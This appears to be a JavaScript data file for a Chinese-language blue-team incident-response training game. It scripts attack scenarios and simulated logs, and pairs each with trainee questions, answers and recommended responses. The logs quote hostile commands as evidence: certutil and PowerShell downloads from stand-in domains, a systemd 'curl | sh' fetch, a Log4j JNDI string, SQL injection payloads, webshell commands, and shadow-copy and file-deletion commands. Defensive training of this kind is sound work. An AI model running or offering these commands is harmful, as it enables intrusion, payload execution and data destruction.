/* ============================================================
   ctf_cases.js — CTF v6 数据包（攻击剧本库 / 红队人设 / 蓝队名册）
   供 ctf.js 引擎消费：window.CTF6
   st 战术阶段：0侦察 1初始访问 2执行 3持久化 4提权 5横向 6渗出 7影响
   ev(c) => { tel, files, inv:[{q,hint,ans}], need, ok, teach }
   ============================================================ */
(function () {
  const r = n => Math.floor(Math.random() * n);
  const pick = a => a[r(a.length)];
  const rip = () => pick(['45.83.66.', '185.220.101.', '91.243.72.', '103.75.190.', '196.52.43.', '89.248.167.']) + (1 + r(254));
  const ripC = () => pick(['10.1.2.7', '10.1.2.66', '10.1.3.88', '10.1.5.12']);
  const ruser = () => pick(['zhangwei', 'lisi', 'wangfang', 'hr02', 'ops01', 'svc_backup']);
  const rhost = () => pick(['WEB-03', 'APP-11', 'OA-02', 'DEV-04', 'GIT-02', 'FILE-01']);
  const rdom = () => pick(['evil-cdn.net', 'update-svc.xyz', 'log-collect.icu', 'paste-log.icu', 'cdn-metrics.top']);

  const A = [
  /* ---------- 0 侦察 ---------- */
  { st: 0, n: 'Nmap 全端口扫描', pf: ['skid', 'bot'], dmg: {},
    ev: c => ({ tel: ['fw: ' + c.host + ' 遭到 SYN 扫描 ×4200/分钟，来源 ' + c.ip, 'ids: 端口扫描特征命中'],
      files: { '/case/fw.log': [
        '02:10:01 DROP TCP ' + c.ip + ':40001 -> 10.1.2.33:22',
        '02:10:01 DROP TCP ' + c.ip + ':40002 -> 10.1.2.33:80',
        '02:10:02 DROP TCP ' + c.ip + ':40003 -> 10.1.2.33:3389',
        '02:10:03 DROP UDP ' + c.ip + ':40004 -> 10.1.2.33:53',
      ]},
      inv: [{ q: '找出扫描来源 IP 并 check 提交', hint: 'grep DROP /case/fw.log 看来源列', ans: [c.ip] }],
      need: [['block', c.ip]], ok: '扫描源已封禁并归档。', teach: '🔍 侦察被 DROP 说明防线有效——封来源+归档即可。' }) },
  { st: 0, n: '被动信息收集（OSINT）', pf: ['apt', 'insider'], dmg: {},
    ev: () => ({ tel: ['intel: 攻击者在 GitHub/领英收集我方架构与员工名单', '注: 被动收集不产生我方日志'],
      files: {}, inv: [], need: [['ignore', '']], ok: '正确。被动收集无法阻断，已收紧公开暴露面。', teach: '🔍 被动侦察在日志里毫无痕迹——考验公开暴露面治理。' }) },
  { st: 0, n: '员工定向社工踩点', pf: ['insider', 'apt'], dmg: {},
    ev: c => ({ tel: ['intel: 内部知识库出现异常查询（' + c.user + ' 的组织架构与权限）', '注: 查询者使用合法账号，行为偏离基线'],
      files: {}, inv: [], need: [['ignore', '']], ok: '已核实为内部低频查询，加入基线观察。', teach: '🔍 合法账号的“踩点”最难判——基线偏离而非关键词命中。' }) },

  /* ---------- 1 初始访问 ---------- */
  { st: 1, n: 'SSH 弱口令爆破', pf: ['skid', 'bot', 'ransom'], dmg: { biz: 10 },
    ev: c => ({ tel: ['alert: ' + c.host + ' SSH 爆破疑似成功！相关日志已拉取到 /case/', 'edr: ' + c.host + ' 出现可疑会话'],
      files: { '/case/auth.log': [
        'Mar 10 03:11:40 ' + c.host + ' sshd[1901]: Failed password for root from ' + c.ip + ' port 44001',
        'Mar 10 03:11:47 ' + c.host + ' sshd[1901]: Failed password for root from ' + c.ip + ' port 44002',
        'Mar 10 03:11:53 ' + c.host + ' sshd[1901]: Failed password for root from ' + c.ip + ' port 44003',
        'Mar 10 03:12:05 ' + c.host + ' sshd[1901]: Accepted password for root from ' + c.ip + ' port 44005',
        'Mar 10 03:12:06 ' + c.host + ' sshd[1901]: pam_unix(sshd:session): session opened for user root',
      ]},
      inv: [{ q: '溯源①：找出爆破来源 IP 并 check 提交', hint: 'grep Accepted /case/auth.log', ans: [c.ip] }],
      need: [['block', c.ip], ['isolate', c.host]],
      ok: '来源封禁 + ' + c.host + ' 已隔离。', teach: '🔑 失败海洋后的 Accepted = 爆破成功。封来源 + 隔离失陷主机。' }) },
  { st: 1, n: 'RDP 爆破', pf: ['ransom', 'bot'], dmg: { biz: 10 },
    ev: c => ({ tel: ['win: ' + c.host + ' RDP 爆破疑似成功！事件日志已拉取到 /case/'],
      files: { '/case/win_events.csv': [
        'time,event,logon_type,user,src',
        '02:00:11,4625,10,administrator,' + c.ip,
        '02:00:22,4625,10,administrator,' + c.ip,
        '02:00:33,4625,10,administrator,' + c.ip,
        '02:01:06,4624,10,administrator,' + c.ip,
      ]},
      inv: [{ q: '溯源①：RDP 爆破来源 IP 并 check 提交', hint: 'grep 4625 /case/win_events.csv', ans: [c.ip] }],
      need: [['block', c.ip], ['isolate', c.host]],
      ok: '爆破源被封，' + c.host + ' 已隔离。', teach: '🖥️ 4625 洪水后一条 4624 = RDP 被攻破。' }) },
  { st: 1, n: '钓鱼附件（宏文档）', pf: ['apt', 'ransom'], dmg: { data: 15 },
    ev: c => ({ tel: ['mailgw+edr: ' + c.user + ' 打开宏文档，' + c.host + ' 已拉起 cmd——相关日志在 /case/'],
      files: { '/case/mailgw.log': [
        '10:00:01 FROM ' + c.dom + ' RCPT=1 ACTION=DELIVERED to=' + c.user + ' subject="简历" attach="简历.docm"',
        '10:00:02 SPF: fail (' + c.dom + ' 未授权发信)',
      ]},
      inv: [{ q: '溯源①：这封钓鱼邮件的发件域名并 check 提交', hint: 'cat /case/mailgw.log 看 FROM 字段', ans: [c.dom] }],
      need: [['isolate', c.host], ['hunt', '']],
      ok: c.host + ' 已隔离，同 Campaign 已回溯。', teach: '📎 一人中招=全组高危：隔离+hunt 同邮件其他收件人。' }) },
  { st: 1, n: 'SQL 注入拖取数据', pf: ['skid'], dmg: { data: 20 },
    ev: c => ({ tel: ['waf+db: 注入攻击疑似成功！访问日志已拉取到 /case/'],
      files: { '/case/access.log': [
        '10.1.2.5 - - "GET /index.html" 200 "Mozilla/5.0"',
        c.ip + ' - - "GET /product.php?id=12%20OR%201=1" 200 "Mozilla/5.0"',
        c.ip + ' - - "GET /product.php?id=0%20UNION%20SELECT%20user,pass%20FROM%20users" 200 "sqlmap/1.7"',
        c.ip + ' - - "GET /product.php?id=0%20UNION%20SELECT%20credit_card%20FROM%20users" 200 "sqlmap/1.7"',
      ]},
      inv: [{ q: '溯源①：注入攻击来源 IP 并 check 提交', hint: 'grep UNION /case/access.log', ans: [c.ip] },
             { q: '溯源②：被拖取数据的表名并 check 提交', hint: '看 UNION SELECT ... FROM 后面', ans: ['users'] }],
      need: [['block', c.ip], ['patch', 'product.php']],
      ok: '注入源已封禁，注入点已修复。', teach: '💉 先封来源止血，再修 product.php 参数化查询。' }) },
  { st: 1, n: 'Webshell 上传', pf: ['skid', 'apt'], dmg: { biz: 15 },
    ev: c => ({ tel: ['waf+http: 上传校验被绕过，Webshell 已执行！日志在 /case/'],
      files: { '/case/access.log': [
        c.ip + ' - - "POST /upload/avatar" 200 "Mozilla/5.0"',
        c.ip + ' - - "POST /uploads/shell.php?pass=whoami" 200 "Mozilla/5.0"',
        c.ip + ' - - "POST /uploads/shell.php?pass=cat+/etc/passwd" 200 "Mozilla/5.0"',
      ]},
      inv: [{ q: '溯源①：Webshell 文件名（含后缀）并 check 提交', hint: 'grep shell /case/access.log', ans: ['shell.php'] }],
      need: [['rm', 'shell.php'], ['patch', 'upload']],
      ok: 'Webshell 已删除，上传校验已修复。', teach: '🕸️ 删马必须配修上传漏洞，否则还会再传。' }) },
  { st: 1, n: 'Log4j JNDI 利用', pf: ['apt', 'ransom'], dmg: { biz: 25 },
    ev: c => ({ tel: ['app: JNDI 利用疑似成功！错误日志已拉取到 /case/'],
      files: { '/case/app_error.log': [
        'ERROR Attempting to resolve ${jndi:ldap://' + c.ip + ':1389/a}',
        'WARN Connection to ' + c.ip + ':1389 established',
        'WARN Class loaded from remote LDAP source',
      ]},
      inv: [{ q: '溯源①：JNDI 回连的 IP 并 check 提交', hint: 'grep jndi /case/app_error.log', ans: [c.ip] }],
      need: [['patch', 'log4j'], ['block', c.ip]],
      ok: 'Log4j 已升级，利用源已封禁。', teach: '🧨 Log4Shell：升级组件根治，回连源也要封。' }) },
  { st: 1, n: 'Java 反序列化 RCE', pf: ['apt'], dmg: { biz: 25 },
    ev: c => ({ tel: ['waf+app: 反序列化攻击疑似成功！日志在 /case/'],
      files: { '/case/waf.log': [
        'POST /web/api/invoke body=rO0ABac10s…(CC 链) src=' + c.ip,
        'app: 响应回显 whoami=root',
      ]},
      inv: [{ q: '溯源①：攻击来源 IP 并 check 提交', hint: 'cat /case/waf.log', ans: [c.ip] }],
      need: [['isolate', c.host], ['patch', 'commons']],
      ok: c.host + ' 已隔离，漏洞组件已升级。', teach: '💣 反序列化 = 直接 RCE，按失陷处置。' }) },
  { st: 1, n: '密码喷洒', pf: ['apt', 'bot'], dmg: { biz: 10 },
    ev: c => ({ tel: ['auth: 同一密码 spraying 多账号——日志已拉取到 /case/'],
      files: { '/case/auth_spray.log': [
        '01:00:01 FAIL user=zhangwei from ' + c.ip + ' pw=Summer2026!',
        '01:00:02 FAIL user=lisi from ' + c.ip + ' pw=Summer2026!',
        '01:00:03 FAIL user=hr02 from ' + c.ip + ' pw=Summer2026!',
        '01:00:05 OK user=ops01 from ' + c.ip + ' pw=Summer2026!',
      ]},
      inv: [{ q: '溯源①：密码喷洒来源 IP 并 check 提交', hint: 'grep pw= /case/auth_spray.log', ans: [c.ip] }],
      need: [['block', c.ip], ['hunt', '']],
      ok: '来源已封禁，并回溯确认无其他成功登录。', teach: '💧 密码喷洒“每号一次”躲锁定——查成功登录+封源。' }) },
  { st: 1, n: '二维码钓鱼', pf: ['apt', 'insider'], dmg: { data: 10 },
    ev: c => ({ tel: ['mailgw: 二维码邮件已送达 ' + c.user + '，其移动端已扫码——日志在 /case/'],
      files: { '/case/mailgw.log': [
        'FROM hr-portal@' + c.dom + ' ACTION=DELIVERED to=' + c.user + ' subject="【年假】确认" body=[QR 图片]',
        'proxy: ' + c.user + ' GET https://' + c.dom + '/login?u=' + c.user + ' (仿冒登录页提交)',
      ]},
      inv: [{ q: '溯源①：仿冒登录页域名并 check 提交', hint: 'cat /case/mailgw.log 配合 proxy 日志', ans: [c.dom] }],
      need: [['passwd', c.user], ['hunt', '']],
      ok: c.user + ' 凭据已重置，同 Campaign 已回溯。', teach: '📱 二维码绕过文本扫描——扫码者凭据必须重置+回溯。' }) },

  /* ---------- 2 执行 ---------- */
  { st: 2, n: 'certutil 下载载荷', pf: ['apt', 'ransom'], dmg: { biz: 10 },
    ev: c => ({ tel: ['edr: certutil 下载行为！进程与网络日志在 /case/'],
      files: { '/case/edr_proc.csv': [
        'time,host,parent,child,cmdline',
        '03:00:01,' + c.host + ',WINWORD.EXE,cmd.exe,/c certutil -urlcache -f http://' + c.dom + '/a.exe',
        '03:00:20,' + c.host + ',cmd.exe,a.exe,落地 %TEMP%\\a.exe',
      ]},
      inv: [{ q: '溯源①：载荷下载域名并 check 提交', hint: 'grep certutil /case/edr_proc.csv', ans: [c.dom] }],
      need: [['kill', 'certutil'], ['block', c.dom]],
      ok: '下载进程已终止，域名已封禁。', teach: '⬇️ certutil 是系统自带下载器（LOLBAS）：杀进程+封域名。' }) },
  { st: 2, n: '混淆 PowerShell 执行', pf: ['apt', 'skid'], dmg: { biz: 15 },
    ev: c => ({ tel: ['edr: 混淆 PowerShell 行为！日志已拉取到 /case/'],
      files: { '/case/edr_ps.log': [
        '22:00:00 ' + c.host + ' WINWORD.EXE -> powershell -nop -w hidden -enc SQBFAFgA',
        '22:00:02 ' + c.host + ' powershell IEX(New-Object Net.WebClient).DownloadString(http://' + c.dom + '/s2)',
      ]},
      inv: [{ q: '溯源①：stage2 分发域名并 check 提交', hint: 'grep Download /case/edr_ps.log', ans: [c.dom] }],
      need: [['kill', 'powershell'], ['isolate', c.host]],
      ok: '恶意 PS 已终止，主机已隔离。', teach: '⚡ 无文件攻击在内存里：杀进程+隔离主机。' }) },
  { st: 2, n: 'WMI 远程执行', pf: ['apt'], dmg: { biz: 15 },
    ev: c => ({ tel: ['sysmon: WMI 滥用行为！日志已拉取到 /case/'],
      files: { '/case/sysmon_wmi.csv': [
        'time,host,event,detail',
        '04:00:00,' + c.host + ',20,WMI 永久订阅: ProcessStart name=upd',
        '04:00:05,' + c.host + ',1,进程: powershell -enc SQBFAFgA',
      ]},
      inv: [{ q: '溯源①：被滥用主机名并 check 提交', hint: 'cat /case/sysmon_wmi.csv', ans: [c.host] }],
      need: [['isolate', c.host], ['rm', 'wmi订阅']],
      ok: 'WMI 滥用主机已隔离，订阅已清除。', teach: '🕹️ WMI 是“无文件执行+持久化”通道——Sysmon 事件 20/21。' }) },
  { st: 2, n: 'DLL 劫持驻留', pf: ['skid', 'bot'], dmg: { biz: 10 },
    ev: c => ({ tel: ['edr: DLL 劫持行为！日志已拉取到 /case/'],
      files: { '/case/edr_dll.log': [
        c.host + ' 正版程序目录新增 version.dll（无签名）',
        c.host + ' 程序启动自动加载 version.dll -> 外联 ' + c.ip,
      ]},
      inv: [{ q: '溯源①：被劫持植入的 DLL 文件名并 check 提交', hint: 'cat /case/edr_dll.log', ans: ['version.dll'] }],
      need: [['rm', 'version.dll']],
      ok: '劫持 DLL 已删除。', teach: '🧩 DLL 劫持：正版程序替恶意库“背书”。查签名+目录白名单。' }) },

  /* ---------- 3 持久化 ---------- */
  { st: 3, n: '计划任务持久化', pf: ['apt', 'ransom', 'skid'], dmg: { biz: 10 },
    ev: c => ({ tel: ['win: 新增可疑计划任务！日志已拉取到 /case/'],
      files: { '/case/schtasks.log': [
        c.host + ' schtasks /create /tn ' + c.user + 'Upd /sc minute /mo 1 /tr powershell -enc',
        c.host + ' 任务 ' + c.user + 'Upd 每分钟执行一次',
      ]},
      inv: [{ q: '溯源①：持久化计划任务名并 check 提交', hint: 'cat /case/schtasks.log', ans: [c.user + 'Upd'] }],
      need: [['rm', c.user + 'Upd']],
      ok: '持久化任务已删除。', teach: '⏰ 每分钟一次的“心跳任务”必须删除。' }) },
  { st: 3, n: '注册表 Run 启动项', pf: ['skid', 'bot'], dmg: { biz: 10 },
    ev: () => ({ tel: ['win: Run 键新增可疑项！注册表导出在 /case/'],
      files: { '/case/reg_run.txt': [
        'HKCU\\...\\Run  onedrives.exe = %APPDATA%\\onedrives.exe  (无签名)',
      ]},
      inv: [{ q: '溯源①：启动项恶意文件名并 check 提交', hint: 'cat /case/reg_run.txt', ans: ['onedrives.exe'] }],
      need: [['rm', 'onedrives.exe']],
      ok: '启动项与落地文件已清除。', teach: '📦 onedrives 冒充 OneDrive：键与文件都要删。' }) },
  { st: 3, n: 'SSH 公钥后门', pf: ['apt'], dmg: { biz: 10 },
    ev: c => ({ tel: ['linux: authorized_keys 出现陌生公钥！文件已拉取到 /case/'],
      files: { '/case/authorized_keys.txt': [
        'ssh-rsa AAAAB3NzaC1yc2EAAA deploy@laptop（本人）',
        'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAI ' + c.dom.split('.')[0] + '-key',
      ]},
      inv: [{ q: '溯源①：陌生公钥的备注标签并 check 提交', hint: 'cat /case/authorized_keys.txt 看每行末尾', ans: [c.dom.split('.')[0] + '-key'] }],
      need: [['rm', 'authorized_keys']],
      ok: '陌生公钥已移除。', teach: '🗝️ 公钥后门不依赖密码——删钥匙并审计全部账号。' }) },
  { st: 3, n: '新建管理员账号', pf: ['ransom', 'apt'], dmg: { biz: 10 },
    ev: c => ({ tel: ['win: 4720 新建账号事件！日志已拉取到 /case/'],
      files: { '/case/win_4720.csv': [
        'time,event,account,by,src',
        '03:20:00,4720,' + c.user + '_tmp,管理员会话,' + ripC(),
        '03:20:01,4732,' + c.user + '_tmp 加入 administrators,',
      ]},
      inv: [{ q: '溯源①：被创建的后门账号名并 check 提交', hint: 'grep 4720 /case/win_4720.csv', ans: [c.user + '_tmp'] }],
      need: [['disable', c.user + '_tmp']],
      ok: '后门账号已禁用（保留现场）。', teach: '👤 先禁用保留证据，审计创建者会话后删除。' }) },
  { st: 3, n: 'systemd 服务持久化', pf: ['apt', 'bot'], dmg: { biz: 10 },
    ev: c => ({ tel: ['linux: 新增可疑 systemd 服务！文件已拉取到 /case/'],
      files: { '/case/dbus-upd.service.txt': [
        '[Service]',
        'ExecStart=/bin/bash -c "curl -s http://' + c.ip + '/s|sh"',
        'Restart=always',
      ]},
      inv: [{ q: '溯源①：该服务的保活下载命令（输 check 命令名）', hint: 'cat /case/dbus-upd.service.txt 看 ExecStart', ans: ['curl'] }],
      need: [['rm', 'dbus-upd.service']],
      ok: '恶意服务文件已删除。', teach: '⚙️ disable、删文件、daemon-reload 三步缺一不可。' }) },
  { st: 3, n: 'WMI 事件订阅持久化', pf: ['apt'], dmg: { biz: 15 },
    ev: c => ({ tel: ['sysmon: WMI 永久订阅！日志已拉取到 /case/'],
      files: { '/case/sysmon_wmi_sub.csv': [
        'time,host,event,name',
        '02:00:00,' + c.host + ',20,订阅名=upd Consumer=powershell -enc',
      ]},
      inv: [{ q: '溯源①：恶意 WMI 订阅名并 check 提交', hint: 'cat /case/sysmon_wmi_sub.csv', ans: ['upd'] }],
      need: [['rm', 'wmi订阅']],
      ok: 'WMI 订阅已清除。', teach: '♾️ WMI 订阅是“无文件持久化”之王。' }) },

  /* ---------- 4 提权 ---------- */
  { st: 4, n: 'SUID 提权后门', pf: ['skid'], dmg: { biz: 10 },
    ev: () => ({ tel: ['linux: SUID 盘点异常！审计输出已拉取到 /case/'],
      files: { '/case/suid.txt': [
        '/usr/bin/sudo',
        '/usr/bin/passwd',
        '/tmp/.cache/update  (SUID root 4777)',
      ]},
      inv: [{ q: '溯源①：可疑 SUID 文件完整路径并 check 提交', hint: 'cat /case/suid.txt 找不在 /usr 下的', ans: ['/tmp/.cache/update'] }],
      need: [['rm', 'update']],
      ok: 'SUID 后门已删除。', teach: '🪜 4777 SUID = 任何用户一键变 root。' }) },
  { st: 4, n: 'Kerberoasting', pf: ['apt'], dmg: { data: 20 },
    ev: c => ({ tel: ['dc: 4769 TGS 请求暴增！日志已拉取到 /case/'],
      files: { '/case/dc_4769.csv': [
        'time,event,account,enc',
        '02:00:00,4769,' + c.user + '_svc,RC4',
        '02:00:01,4769,' + c.user + '_svc,RC4',
        '02:00:02,4769,' + c.user + '_svc,RC4',
      ]},
      inv: [{ q: '溯源①：被 Kerberoast 的服务账号并 check 提交', hint: 'grep 4769 /case/dc_4769.csv', ans: [c.user + '_svc'] }],
      need: [['passwd', c.user + '_svc']],
      ok: '服务账号密码已重置（票据作废）。', teach: '🎟️ Kerberoasting 抓票据离线爆破——重置密码使票据作废。' }) },
  { st: 4, n: 'DCSync 域哈希窃取', pf: ['apt'], dmg: { data: 30 },
    ev: c => ({ tel: ['dc: 4662 复制请求！日志已拉取到 /case/'],
      files: { '/case/dc_4662.csv': [
        'time,event,account,src_host,src_ip',
        '02:20:00,4662,' + c.user + '_svc,' + c.host + ',' + ripC(),
        '02:20:00,4662,' + c.user + '_svc,' + c.host + ',' + ripC() + ' DSReplicationGetChangesAll',
      ]},
      inv: [{ q: '溯源①：发起 DCSync 的主机名并 check 提交', hint: 'grep 4662 /case/dc_4662.csv 看 src_host', ans: [c.host] }],
      need: [['isolate', c.host], ['passwd', c.user + '_svc']],
      ok: '发起主机已隔离，凭据已重置。', teach: '👑 DCSync：隔离+重置凭据+krbtgt 两次重置。' }) },
  { st: 4, n: '内核漏洞本地提权', pf: ['skid', 'bot'], dmg: { biz: 20 },
    ev: () => ({ tel: ['linux: 内核提权成功！审计已拉取到 /case/'],
      files: { '/case/audit_priv.log': [
        'kernel: CVE-2026-0815 原语触发成功 (uid=1000 -> uid=0)',
        'audit: 提权后执行 crontab -e',
      ]},
      inv: [{ q: '溯源①：被利用的漏洞编号并 check 提交', hint: 'cat /case/audit_priv.log', ans: ['CVE-2026-0815', '0815', '2026-0815'] }],
      need: [['patch', 'kernel']],
      ok: '内核已升级，提权通道关闭。', teach: '🧗 内核提权无脑解 = patch kernel。' }) },

  /* ---------- 5 横向移动 ---------- */
  { st: 5, n: 'psexec/SMB 横向移动', pf: ['ransom', 'apt'], dmg: { biz: 20 },
    ev: c => ({ tel: ['ndr: SMB 横向会话！流量日志已拉取到 /case/'],
      files: { '/case/ndr_smb.log': [
        c.ip + ' -> 10.1.2.40:445 admin$ 会话建立 (psexec 风格)',
        c.ip + ' -> 10.1.2.41:445 admin$ 会话建立',
      ]},
      inv: [{ q: '溯源①：横向发起主机 IP 并 check 提交', hint: 'cat /case/ndr_smb.log 看 -> 左侧', ans: [c.ip] }],
      need: [['isolate', c.ip]],
      ok: '横向发起主机已隔离。', teach: '🚚 源头不隔离，封多少目标机都没用。' }) },
  { st: 5, n: 'Pass-the-Hash 横向', pf: ['apt'], dmg: { data: 15 },
    ev: c => ({ tel: ['win: NTLM 哈希直登！事件已拉取到 /case/'],
      files: { '/case/win_pth.csv': [
        'time,host,event,logon_type,user,src',
        '05:00:00,' + c.host + ',4624,9,' + c.user + ',' + ripC(),
      ]},
      inv: [{ q: '溯源①：被盗用凭据的账号并 check 提交', hint: 'grep 4624 /case/win_pth.csv 看 user 列', ans: [c.user] }],
      need: [['passwd', c.user], ['isolate', c.host]],
      ok: '凭据已重置，源主机已隔离。', teach: '#️⃣ PtH 用哈希不当密码——重置凭据使旧哈希作废。' }) },
  { st: 5, n: 'RDP 跳板扩散', pf: ['ransom', 'bot'], dmg: { biz: 15 },
    ev: c => ({ tel: ['win: RDP 跳板行为！日志已拉取到 /case/'],
      files: { '/case/rdp_sessions.csv': [
        'time,host,target,channel',
        '05:00:00,' + c.host + ',' + ripC() + ',RDP 会话 + 驱动器重定向',
      ]},
      inv: [{ q: '溯源①：跳板主机名并 check 提交', hint: 'cat /case/rdp_sessions.csv', ans: [c.host] }],
      need: [['isolate', c.host]],
      ok: '跳板主机已隔离。', teach: '🖥️ 跳板会话带驱动器重定向=文件可双向搬运。' }) },

  /* ---------- 6 数据渗出 ---------- */
  { st: 6, n: '数据库拖库', pf: ['skid', 'apt', 'insider'], dmg: { data: 25 },
    ev: c => ({ tel: ['db: 大规模整表查询！通用查询日志已拉取到 /case/'],
      files: { '/case/mysql_general.csv': [
        'ts,client,query,rows',
        '02:12:55,' + c.ip + ',"SELECT * FROM users WHERE id=1",1',
        '02:13:01,' + c.ip + ',"SELECT * FROM users",120000',
        '02:13:10,' + c.ip + ',"SELECT * FROM orders",860000',
      ]},
      inv: [{ q: '溯源①：拖库来源 IP 并 check 提交', hint: 'cat /case/mysql_general.csv 看 rows 最大的', ans: [c.ip] },
             { q: '溯源②：被拖行数最多的表并 check 提交', hint: '同上，看表名', ans: ['orders'] }],
      need: [['block', c.ip]],
      ok: '拖库连接已切断。', teach: '📤 先断会话止损，再评估合规义务。' }) },
  { st: 6, n: 'DNS 隧道数据外传', pf: ['apt'], dmg: { data: 20 },
    ev: c => ({ tel: ['dns: TXT 隧道查询！日志已拉取到 /case/'],
      files: { '/case/dns_query.log': [
        c.host + ' TXT aXNvY2Q.r1.data-t.' + c.dom,
        c.host + ' TXT cGFzc3dvcmQ.r2.data-t.' + c.dom,
        c.host + ' A www.baidu.com',
      ]},
      inv: [{ q: '溯源①：隧道主域名并 check 提交', hint: 'cat /case/dns_query.log 看超长子域名结尾', ans: [c.dom] },
             { q: '溯源②：进行隧道通信的主机名并 check 提交', hint: '看查询来源列', ans: [c.host] }],
      need: [['block', c.dom], ['hunt', '']],
      ok: '隧道域名已封禁，并全网回溯同通道主机。', teach: '📡 封域名+隔离+hunt 回溯——隧道往往不止一台在用。' }) },
  { st: 6, n: '个人网盘数据外带', pf: ['insider'], dmg: { data: 20 },
    ev: c => ({ tel: ['dlp: 个人网盘外带行为！日志已拉取到 /case/'],
      files: { '/case/dlp.csv': [
        'time,host,user,file,size,dest',
        '23:30:00,' + c.host + ',' + c.user + ',src.tar.gz,180MB,personal-pan',
      ]},
      inv: [{ q: '溯源①：外带行为发生的主机名并 check 提交', hint: 'cat /case/dlp.csv', ans: [c.host] }],
      need: [['isolate', c.host]],
      ok: '涉事终端已隔离，通道中断。', teach: '📦 内鬼外带：隔离保证据，后续走合规与法务。' }) },
  { st: 6, n: '内网嗅探抓凭据', pf: ['bot', 'apt'], dmg: { data: 15 },
    ev: c => ({ tel: ['ndr: 混杂模式嗅探！日志已拉取到 /case/'],
      files: { '/case/ndr_sniff.log': [
        c.host + ' 网卡开启混杂模式（抓包）',
        c.host + ' 已捕获 NTLM Challenge/Response 多组',
      ]},
      inv: [{ q: '溯源①：嗅探行为主机名并 check 提交', hint: 'cat /case/ndr_sniff.log', ans: [c.host] }],
      need: [['isolate', c.host]],
      ok: '嗅探主机已隔离。', teach: '👂 混杂模式=在听内网广播的每一句“悄悄话”。' }) },

  /* ---------- 7 影响 ---------- */
  { st: 7, n: '勒索软件加密', pf: ['ransom'], dmg: { biz: 40, data: 40 },
    ev: c => ({ tel: ['edr: 勒索加密进行中！文件审计已拉取到 /case/'],
      files: { '/case/file_audit.csv': [
        'time,host,proc,action,target',
        '03:40:00,' + c.host + ',svhost.exe,ENCRYPT,D:\\docs\\q3.doc -> .locked',
        '03:40:30,' + c.host + ',cmd.exe,EXEC,vssadmin delete shadows /all /quiet',
      ]},
      inv: [{ q: '溯源①：执行加密的伪装进程名并 check 提交', hint: 'grep ENCRYPT /case/file_audit.csv', ans: ['svhost.exe', 'svhost'] },
             { q: '溯源②：删除卷影副本的命令关键词并 check 提交', hint: '找 delete shadows 那行', ans: ['vssadmin'] }],
      need: [['isolate', c.host], ['restore', 'backup']],
      ok: c.host + ' 已隔离，备份恢复流程已启动。', teach: '🧊 隔离（不关机）+ 从离线备份恢复——绝不建议交赎金。' }) },
  { st: 7, n: '挖矿木马', pf: ['bot', 'skid'], dmg: { biz: 15 },
    ev: c => ({ tel: ['host+net: 挖矿行为确认！进程与外联日志在 /case/'],
      files: { '/case/miner.log': [
        c.host + ' proc: kdevtmpfsi CPU 99.2% ×6h',
        c.host + ' net: ESTABLISHED 91.243.72.5:3333',
      ]},
      inv: [{ q: '溯源①：挖矿进程名并 check 提交', hint: 'cat /case/miner.log', ans: ['kdevtmpfsi'] },
             { q: '溯源②：矿池 IP 并 check 提交', hint: '看外联那行', ans: ['91.243.72.5'] }],
      need: [['kill', 'kdevtmpfsi'], ['block', '91.243.72.5']],
      ok: '挖矿进程终止，矿池封禁。', teach: '⛏️ 杀进程+封矿池+清持久化。' }) },
  { st: 7, n: '官网首页篡改', pf: ['skid'], dmg: { biz: 10 },
    ev: c => ({ tel: ['waf+web: 首页篡改！日志已拉取到 /case/'],
      files: { '/case/web_deface.log': [
        'POST /admin/page/edit 200 (登录: admin / 弱口令)',
        'index.html 新增暗链: http://' + c.dom + '/buy (display:none)',
      ]},
      inv: [{ q: '溯源①：被植入的暗链域名并 check 提交', hint: 'grep 暗链或 display /case/web_deface.log', ans: [c.dom] }],
      need: [['rm', 'index.html'], ['patch', 'admin']],
      ok: '页面已恢复，后台口令已加固。', teach: '🕳️ 恢复页面之前先堵后台。' }) },
  { st: 7, n: '关键数据删除破坏', pf: ['apt', 'insider'], dmg: { data: 35 },
    ev: c => ({ tel: ['edr: 数据删除行为！审计已拉取到 /case/'],
      files: { '/case/del_audit.csv': [
        'time,host,proc,action',
        '04:00:00,' + c.host + ',cmd.exe,del /f /s /q D:\\projects\\',
        '04:00:10,' + c.host + ',cmd.exe,vssadmin delete shadows',
      ]},
      inv: [{ q: '溯源①：执行删除的主机名并 check 提交', hint: 'cat /case/del_audit.csv', ans: [c.host] }],
      need: [['isolate', c.host]],
      ok: '破坏行为主机已隔离，备份完好。', teach: '💣 数据破坏=影响战术。离线备份是唯一可靠解药。' }) },
  ];

  /* ---------- 蓝绿噪音事件（纯播报，训练“先定性再动手”） ---------- */
  const BENIGN = [
    { n: '数据库夜间备份任务', g: () => ['db: 02:00-02:30 大量 SELECT + 备份机写入 8GB', '台账: 备份窗口已报备'] },
    { n: '运营大促流量洪峰', g: () => ['gw: QPS 峰值 8600（基线 800）', 'ops 群: 大促公告已发'] },
    { n: '安全部月度漏扫', g: () => ['scan: 10.1.9.9 全站扫描（Nessus 模板）', 'ticket: 变更单已审批'] },
    { n: '新服务器上线批量外联', g: () => ['net: 10.1.9.30 批量连接 CMDB/补丁服务器', 'asset: 该主机今日上线（变更单已录）'] },
    { n: 'HR 系统年终批量查询', g: () => ['app: hr02 批量查询员工档案（年报统计期）', 'ticket: 年度报表任务已批准'] },
  ];

  /* ---------- 红队 5 人设 / 蓝队 AI 14 人 / 段位 ---------- */
  const RED = [
    { id: 'skid', name: 'Skid_K1ller（脚本小子）', chain: [0, 1, 2, 3, 7], maxAccess: 2 },
    { id: 'apt', name: 'APT_Ph4ntom（APT 组织）', chain: [0, 1, 2, 3, 4, 5, 6], maxAccess: 3 },
    { id: 'ransom', name: 'LockByte（勒索团伙）', chain: [1, 3, 5, 7], maxAccess: 3 },
    { id: 'bot', name: 'B0tMaster_9（僵尸网络）', chain: [0, 1, 3, 4, 7], maxAccess: 2 },
    { id: 'insider', name: 'Ghost_HR（内鬼）', chain: [6], maxAccess: 1 },
  ];
  const BLUE_NAMES = ['老陈', '小林', 'Ava', '大白', '夜莺', 'Stone', '阿杰', 'Momo', '老K', '小鹿', 'Vince', '南笙', '大熊', 'Lina'];
  const ACC = ['未得手', '初步立足', '权限提升', '横向扩散'];
  const SEGS = [[1800, '最强王者'], [1600, '璀璨钻石'], [1400, '尊贵铂金'], [1200, '荣耀黄金'], [1000, '不屈白银'], [0, '坚韧黄铜']];

  window.CTF6 = { A: A, BENIGN: BENIGN, RED: RED, BLUE_NAMES: BLUE_NAMES, ACC: ACC, SEGS: SEGS, rip: rip, ruser: ruser, rhost: rhost, rdom: rdom };
})();
